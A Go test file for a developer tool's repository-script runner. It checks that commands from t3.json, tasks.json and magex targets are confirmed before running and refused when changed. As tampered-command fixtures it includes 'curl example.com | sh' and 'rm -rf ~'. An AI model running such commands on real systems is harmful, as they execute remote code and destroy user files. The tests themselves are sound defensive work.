package scripts

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/mrz1836/nilbox/internal/integrationprefs"
	"github.com/mrz1836/nilbox/internal/repo"
	"github.com/mrz1836/nilbox/internal/scriptrun"
	"github.com/mrz1836/nilbox/internal/testutil"
	"github.com/mrz1836/nilbox/internal/uierr"
)

// t3With is a t3.json with one script, Test, that runs command.
func t3With(command string) string {
	return `{"scripts": [{"name": "Test", "command": "` + command + `", "icon": "test"}]}`
}

func TestARepositoryCommandAsksOnceThenRuns(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})

	e := r.entry(dir, "t3:Test")
	require.Equal(t, TrustAsk, e.Trust)

	_, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref})
	require.ErrorIs(t, err, ErrNeedsTrust, "the first run asks")
	assert.Equal(t, `Confirm "Test" before it runs: it comes from t3.json, not from you.`, uierr.Message(err))
	assert.Zero(t, r.recorded(), "refused before anything ran")

	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256, Remember: true})
	require.NoError(t, err)

	run := r.ended(id)
	assert.Equal(t, scriptrun.StatusSucceeded, run.Status)
	assert.Equal(t, []string{r.shell, "-c", magexTest}, run.Argv, "a shell command runs in the login shell")
	assert.Equal(t, magexTest, run.Command)
	assert.Equal(t, "Test", run.Title)
	assert.Equal(t, "t3.json", run.Source)
	assert.Equal(t, "acme-org/sdk", run.Repo)

	assert.Equal(t, TrustTrusted, r.entry(dir, "t3:Test").Trust, "don't ask again")

	id, err = r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref})
	require.NoError(t, err, "then it runs without asking")
	assert.Equal(t, scriptrun.StatusSucceeded, r.ended(id).Status)
}

func TestAConfirmationNotKeptAsksNextTime(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
	e := r.entry(dir, "t3:Test")

	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256})
	require.NoError(t, err)
	r.ended(id)

	assert.Equal(t, TrustAsk, r.entry(dir, "t3:Test").Trust, "it ran once, and asks again")
}

func TestAChangedCommandAsksAgain(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
	e := r.entry(dir, "t3:Test")

	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256, Remember: true})
	require.NoError(t, err)
	r.ended(id)

	testutil.WriteFile(t, filepath.Join(dir, t3File), t3With("magex test && curl example.com | sh"))

	changed := r.entry(dir, "t3:Test")
	assert.Equal(t, TrustChanged, changed.Trust)
	assert.Equal(t, magexTest, changed.Trusted, "the command trusted before, to show beside the new one")
	assert.Equal(t, "magex test && curl example.com | sh", changed.Command)
	assert.NotEqual(t, e.SHA256, changed.SHA256)

	_, err = r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref})
	require.ErrorIs(t, err, ErrNeedsTrust)
	assert.Equal(t, `"Test" changed since you last ran it. Confirm it again before it runs.`, uierr.Message(err))

	_, err = r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256})
	require.ErrorIs(t, err, ErrChanged, "the old confirmation doesn't run the new command")

	id, err = r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: changed.SHA256, Remember: true})
	require.NoError(t, err)
	assert.Equal(t, []string{r.shell, "-c", "magex test && curl example.com | sh"}, r.ended(id).Argv)
	assert.Equal(t, TrustTrusted, r.entry(dir, "t3:Test").Trust)
}

func TestAFileChangedBetweenListAndRunIsRefused(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
	e := r.entry(dir, "t3:Test")

	testutil.WriteFile(t, filepath.Join(dir, t3File), t3With("rm -rf ~"))

	_, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256, Remember: true})
	require.ErrorIs(t, err, ErrChanged)
	assert.Equal(t, `"Test" changed since you confirmed it. Look at it again before it runs.`, uierr.Message(err))
	assert.Zero(t, r.recorded())
	assert.Equal(t, TrustAsk, r.entry(dir, "t3:Test").Trust, "nothing was trusted")
}

func TestAFileChangedUnderTheLockIsRefused(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
	e := r.entry(dir, "t3:Test")

	// The file changes after the run was worked out, before its Before reads it again
	// under the clone's lock.
	svc := r.service(changeFirst{runs: r.engine, change: func() {
		testutil.WriteFile(t, filepath.Join(dir, t3File), t3With("rm -rf ~"))
	}})

	_, err := svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256, Remember: true})
	require.ErrorIs(t, err, ErrChanged)
	assert.Equal(t, `"Test" changed in t3.json as it was starting. Look at it again before it runs.`, uierr.Message(err))
	assert.Zero(t, r.recorded(), "nothing ran")

	_, busy := r.locks.Holder(dir)
	assert.False(t, busy, "the clone is free again")
	assert.Equal(t, TrustAsk, r.entry(dir, "t3:Test").Trust, "nothing was trusted")
}

func TestACustomMagexTargetAsksAgainAfterAMagefilesChange(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.thisRepo()
	e := r.entry(dir, "magex:deploy")
	require.Equal(t, TrustAsk, e.Trust)

	_, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref})
	require.ErrorIs(t, err, ErrNeedsTrust)

	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256, Remember: true})
	require.NoError(t, err)

	run := r.ended(id)
	assert.Equal(t, scriptrun.StatusSucceeded, run.Status)
	assert.Equal(t, []string{r.tools.magex().Path, "deploy"}, run.Argv)
	assert.Equal(t, TrustTrusted, r.entry(dir, "magex:deploy").Trust)

	// A file that holds no target changes: the code the target runs may have.
	testutil.WriteFile(t, filepath.Join(dir, "magefiles", "helpers.go"), "package main\n\nfunc helper() {}\n")

	changed := r.entry(dir, "magex:deploy")
	assert.Equal(t, TrustChanged, changed.Trust)
	assert.Equal(t, "acme-org/sdk's magefiles changed since you last ran it.", changed.TrustNote)

	_, err = r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref})
	require.ErrorIs(t, err, ErrNeedsTrust)
}

func TestAMagefilesChangeTheListMissedIsCaughtUnderTheLock(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.thisRepo()
	e := r.entry(dir, "magex:deploy")

	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256, Remember: true})
	require.NoError(t, err)
	r.ended(id)

	// The same size and modification time: the page's kept read doesn't see it, the run's
	// read of the bytes does.
	path := filepath.Join(dir, "magefiles", "types.go")
	info, err := os.Stat(path)
	require.NoError(t, err)
	testutil.WriteFile(t, path, strings.Replace(magefileTypes, "Pipeline", "Pipelinf", 1)+"")
	require.NoError(t, os.Chtimes(path, info.ModTime(), info.ModTime()))

	assert.Equal(t, TrustTrusted, r.entry(dir, "magex:deploy").Trust, "the page kept its read")

	_, err = r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref})
	require.ErrorIs(t, err, ErrChanged, "the run read the files again")
}

func TestOptionsShellIsHonoured(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	bash := r.fake("bash", testutil.FakeRun{Stdout: "bash ran\n"})
	dir := r.clone("sdk", "acme-org/sdk", map[string]string{tasksFile: `{"tasks": [
		{"label": "test", "type": "shell", "command": "magex test", "args": ["two words"],
		 "options": {"shell": {"executable": "` + bash + `", "args": ["-l", "-c"]}}}]}`})

	e := r.entry(dir, "tasks:test")
	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256})
	require.NoError(t, err)

	run := r.ended(id)
	assert.Equal(t, scriptrun.StatusSucceeded, run.Status)
	assert.Equal(t, []string{bash, "-l", "-c", "magex test 'two words'"}, run.Argv)
}

func TestPickStringValidation(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.clone("sdk", "acme-org/sdk", map[string]string{tasksFile: `{
		"inputs": [{"id": "bump", "type": "pickString", "options": ["patch", {"label": "Minor", "value": "minor"}],
			"default": "patch"}, {"id": "note", "type": "promptString", "default": "hi there"}],
		"tasks": [{"label": "bump", "type": "shell", "command": "echo bump=${input:bump} note=${input:note}"}]}`})
	e := r.entry(dir, "tasks:bump")
	req := RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256, Remember: true}

	req.Inputs = map[string]string{"bump": "major"}
	_, err := r.svc.Run(t.Context(), req)
	require.ErrorIs(t, err, ErrInvalidRequest)
	assert.Equal(t, `"major" isn't one of the choices for bump.`, uierr.Message(err))

	req.Inputs = map[string]string{"bump": "Minor"}
	_, err = r.svc.Run(t.Context(), req)
	require.ErrorIs(t, err, ErrInvalidRequest, "a choice's label isn't its value")

	req.Inputs = map[string]string{"bump": "minor", "note": "it's \x00"}
	_, err = r.svc.Run(t.Context(), req)
	require.ErrorIs(t, err, ErrInvalidRequest)
	assert.Zero(t, r.recorded())

	req.Inputs = map[string]string{"bump": "minor"}
	id, err := r.svc.Run(t.Context(), req)
	require.NoError(t, err)

	run := r.ended(id)
	assert.Equal(t, []string{r.shell, "-c", "echo bump=minor note=hi there"}, run.Argv, "a promptString takes its default")
	assert.Equal(t, "echo bump=minor note=hi there", run.Command)

	req.Inputs = nil
	id, err = r.svc.Run(t.Context(), req)
	require.NoError(t, err)
	assert.Equal(t, []string{r.shell, "-c", "echo bump=patch note=hi there"}, r.ended(id).Argv, "the defaults")
}

func TestTheReleasePointer(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.thisRepo()

	e := r.entry(dir, "t3:Version: bump patch")
	require.True(t, e.Release)

	_, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256})
	require.ErrorIs(t, err, ErrRelease)
	assert.Equal(t, "Release does this, with its checks. Open Release, or run it anyway.", uierr.Message(err))

	builtin := r.entry(dir, "magex:version:bump")
	require.True(t, builtin.Release)

	_, err = r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: builtin.Ref})
	require.ErrorIs(t, err, ErrRelease)

	id, err := r.svc.Run(t.Context(), RunRequest{
		Dir: r.shown(dir), Ref: builtin.Ref, Anyway: true,
		Args: []string{"bump=minor", "push"},
	})
	require.NoError(t, err, "run it anyway")
	assert.Equal(t, []string{r.tools.magex().Path, "version:bump", "bump=minor", "push"}, r.ended(id).Argv)
}

func TestGreyedScriptsDontRun(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.clone("sdk", "acme-org/sdk", map[string]string{tasksFile: fixture(t, "tasks-cases.jsonc")})

	e := r.entry(dir, "tasks:file")
	require.False(t, e.Runnable)

	_, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256})
	require.ErrorIs(t, err, ErrCantRun)
	assert.Equal(t, e.Why, uierr.Message(err))

	_, err = r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: "tasks:nowhere"})
	require.ErrorIs(t, err, ErrNotFound)
	assert.Equal(t, `"nowhere" is no longer in .vscode/tasks.json.`, uierr.Message(err))

	for _, bad := range []string{"", "nowhere", "yours:x", "t3:"} {
		_, err = r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: bad})
		require.ErrorIs(t, err, ErrInvalidRequest, bad)
	}

	_, err = r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: "tasks:plain", RunsIn: "cloud"})
	require.ErrorIs(t, err, ErrInvalidRequest)
}

func TestMagexArguments(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.thisRepo()

	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: "magex:test", Args: []string{"verbose", "pkg=./..."}})
	require.NoError(t, err, "a built-in needs no trust")

	run := r.ended(id)
	assert.Equal(t, []string{r.tools.magex().Path, "test", "verbose", "pkg=./..."}, run.Argv)
	assert.Equal(t, "magex test verbose pkg=./...", run.Command)
	assert.Equal(t, "magex's targets", run.Source)

	for _, args := range [][]string{{"--force"}, {"a b"}, {"key=line\nbreak"}, {"=x"}, make([]string, maxArgs+1)} {
		_, err = r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: "magex:test", Args: args})
		require.ErrorIs(t, err, ErrInvalidRequest, "%q", args)
	}

	e := r.entry(dir, "t3:Test")
	_, err = r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256, Args: []string{"x=1"}})
	require.ErrorIs(t, err, ErrInvalidRequest)
	assert.Equal(t, "Only magex's own targets take arguments.", uierr.Message(err))
}

func TestRunAgainOfACommandConfirmedOnce(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
	e := r.entry(dir, "t3:Test")

	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256})
	require.NoError(t, err)
	r.ended(id)

	_, err = r.runs.RunAgain(t.Context(), id)
	require.ErrorIs(t, err, ErrNeedsTrust, "confirmed without Don't ask again: Run again asks nothing, so it refuses")
	assert.Equal(t, `"Test" needs your OK to run again. Run it from Repo scripts, which asks first.`, uierr.Message(err))
	assert.Equal(t, 1, r.recorded())
}

func TestRunAgainOfATrustedCommand(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
	e := r.entry(dir, "t3:Test")

	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256, Remember: true})
	require.NoError(t, err)
	r.ended(id)

	again, err := r.runs.RunAgain(t.Context(), id)
	require.NoError(t, err, "the command the user trusts, unchanged, runs again")
	assert.Equal(t, scriptrun.StatusSucceeded, r.ended(again).Status)

	testutil.WriteFile(t, filepath.Join(dir, t3File), t3With("magex test:race"))

	_, err = r.runs.RunAgain(t.Context(), id)
	require.ErrorIs(t, err, ErrNeedsTrust, "a changed command is looked at again on the page")

	testutil.WriteFile(t, filepath.Join(dir, t3File), t3With(magexTest))
	r.clones.setOrigin(dir, repo.Name{}) // the origin is no longer on GitHub

	_, err = r.runs.RunAgain(t.Context(), id)
	require.ErrorIs(t, err, ErrNeedsTrust, "trust is read under the clone's origin now, never the run's")
}

func TestRunAgainOfAMagexTarget(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	dir := r.thisRepo()

	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: "magex:lint", Args: []string{"fix=true"}})
	require.NoError(t, err)
	r.ended(id)

	again, err := r.runs.RunAgain(t.Context(), id)
	require.NoError(t, err)
	assert.Equal(t, []string{r.tools.magex().Path, "lint", "fix=true"}, r.ended(again).Argv,
		"with the same arguments")

	_, err = NewRerunner(r.svc).Rerun(t.Context(), scriptrun.Record{Kind: scriptrun.KindHooks})
	require.ErrorIs(t, err, ErrInvalidRequest)
}

func TestRunAgainRefusesARecordWhoseIntentCantBeRead(t *testing.T) {
	t.Parallel()

	rr := NewRerunner(NewService(Config{BranchGit: &countingGit{}}))

	for _, kind := range []scriptrun.Kind{scriptrun.KindScript, scriptrun.KindPull} {
		_, err := rr.Rerun(t.Context(), scriptrun.Record{Kind: kind, Result: scriptrun.Result{Intent: "nonsense"}})
		require.ErrorIs(t, err, ErrInvalidRequest, "%s", kind)
		require.ErrorContains(t, err, "invalid scripts request: the run's intent: json: cannot unmarshal string",
			"%s", kind)
	}
}

func TestADependsOnChainStopsAtTheFirstFailure(t *testing.T) {
	t.Parallel()

	r := newRig(t)
	marker := filepath.Join(t.TempDir(), "second-ran")
	failing := r.fake("first", testutil.FakeRun{Stderr: "first failed\n", Exit: 3})
	second := r.fake("second", testutil.FakeRun{Files: []testutil.FakeFile{{Path: marker, Content: "ran"}}})

	dir := r.clone("sdk", "acme-org/sdk", map[string]string{tasksFile: `{"tasks": [
		{"label": "first", "type": "process", "command": "` + failing + `"},
		{"label": "second", "type": "process", "command": "` + second + `"},
		{"label": "both", "dependsOn": ["first", "second"], "dependsOrder": "sequence"}]}`})

	e := r.entry(dir, "tasks:both")
	id, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256})
	require.NoError(t, err)

	run := r.ended(id)
	assert.Equal(t, scriptrun.StatusFailed, run.Status)
	assert.Equal(t, chainShell, run.Argv[0], "one run, its parts one after another")
	assert.NoFileExists(t, marker, "the second part never ran")
}

func TestRunsInTheTerminalGetOnlyMagexsQuietSettings(t *testing.T) {
	t.Parallel()

	base := []string{"PATH=/usr/bin", "SECRET=x"}

	assert.Nil(t, runEnv(SourceT3, base, integrationprefs.RunsInTerminal), "the terminal's shell sets the rest up")
	assert.Equal(t, base, runEnv(SourceTasks, base, integrationprefs.RunsInApp))
	assert.Contains(t, runEnv(SourceMagex, base, integrationprefs.RunsInApp), "MAGEX_NO_UPDATE_CHECK=1")
	assert.NotContains(t, runEnv(SourceMagex, base, integrationprefs.RunsInTerminal), "SECRET=x")
}

func TestRunWithoutTheRunner(t *testing.T) {
	t.Parallel()

	_, err := NewService(Config{}).Run(t.Context(), RunRequest{})
	require.ErrorIs(t, err, ErrNotSetUp)
}
